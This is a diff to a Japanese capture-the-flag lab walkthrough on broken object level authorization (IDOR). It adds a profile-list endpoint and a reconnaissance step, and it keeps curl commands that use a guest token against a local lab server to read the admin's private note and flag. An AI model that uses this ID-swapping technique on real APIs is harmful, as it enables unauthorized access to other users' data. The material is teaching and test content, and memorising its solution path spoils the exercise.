@@ -22,6 +22,11 @@ OWASP API Security Top 10 **API1:2023 Broken Object Level Authorization
 あなたは`guest`としてログイン済みで、APIトークンは`token-guest`です。
 
 - `GET /api/profile`はトークンに対応する自分のプロフィールを返します。
+- `GET /api/profiles`は、あなたが閲覧を許可されたプロフィールの一覧を返します。
+  guestの場合は自分のものだけを`[{id, username, role}]`（`note`は含まない）として
+  返します。これは意図した挙動で、所有権チェックと秘密フィールドの除外の両方を
+  行うため、第二のIDORにはなりません。実際のAPI調査のように、プロフィールの
+  形（`id`が小さな整数であること）に気づけるようにするためのエンドポイントです。
 - `GET /api/profile/<id>`はログインだけを確認し、指定IDを読む権限を確認しません。
 
 管理者はユーザーID `1`で、非公開の`note`にフラグがあります。管理者トークンは不要です。
@@ -37,19 +42,30 @@ OWASP API Security Top 10 **API1:2023 Broken Object Level Authorization
      http://127.0.0.1:18080/api/profile
    ```
 
-4. IDを管理者の`1`へ変更します。
+4. 偵察として、閲覧可能なプロフィール一覧を確認します。
+
+   ```bash
+   curl -H "Authorization: Bearer token-guest" \
+     http://127.0.0.1:18080/api/profiles
+   ```
+
+   返るのは自分の分だけです（`{"profiles":[{"id":3,...}]}`）が、`id`が小さな
+   整数だとわかるので、`1`のような他のIDも試す価値があると気づけます。
+
+5. IDを管理者の`1`へ変更します。
 
    ```bash
    curl -H "Authorization: Bearer token-guest" \
      http://127.0.0.1:18080/api/profile/1
    ```
 
-5. `note`内の`TC{...}`をPortalへ提出します。
+6. `note`内の`TC{...}`をPortalへ提出します。
 
 | リクエスト | 結果 |
 | --- | --- |
 | トークンなしで`GET /api/profile/1` | `401` |
 | guestで`GET /api/profile` | 自分のプロフィールを`200`で返す |
+| guestで`GET /api/profiles` | 自分の要約だけを`200`で返す（`note`なし、他人の分もなし） |
 | guestで`GET /api/profile/1` | 管理者の非公開情報まで`200`で返す |
 
 ## 根本原因と対策
